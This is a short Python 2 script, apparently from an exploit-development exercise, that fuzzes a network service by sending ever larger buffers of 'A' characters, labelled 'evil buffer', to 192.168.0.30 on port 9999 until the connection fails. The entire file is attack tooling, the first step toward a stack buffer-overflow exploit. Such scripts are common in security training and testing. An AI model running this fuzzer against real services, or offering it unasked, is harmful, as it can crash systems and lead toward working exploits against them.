#!/usr/bin/python
import socket
import time
import sys

size = 100
while(size < 800):
  try:
    print "\nSending evil buffer with size %d..." % size
    inputBuffer = "A" * size
    content = inputBuffer

    buffer = content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("192.168.0.30",9999))
    s.send(buffer)

    s.close()
    size += 100
    time.sleep(10)
    print "\nDone!"
  except:
    print "Could not connect!"
    sys.exit()
